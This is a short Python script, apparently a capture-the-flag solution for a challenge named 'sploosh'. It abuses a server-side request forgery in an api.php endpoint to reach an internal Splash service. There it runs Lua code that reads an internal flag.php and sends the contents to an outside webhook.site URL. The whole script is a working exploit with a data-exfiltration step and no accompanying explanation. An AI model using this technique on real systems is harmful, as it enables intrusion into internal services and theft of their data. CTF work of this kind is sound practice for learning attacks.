import requests
from urllib import quote

lua = """
function main(splash)
    local treat = require("treat")
    local json = splash:http_get('http://172.16.0.14/flag.php')
    local response = splash:http_get('https://webhook.site/c5c3b319-bf6d-4e41-a75c-b1c7ef87665e?flag=' .. treat.as_string(json.body))
    return "hi"
end         
"""
 
url = 'http://sploosh.chal.perfect.blue/api.php?url=http://splash:8050/execute?lua_source=' + quote(lua)
response = requests.get(url)
print(response.text)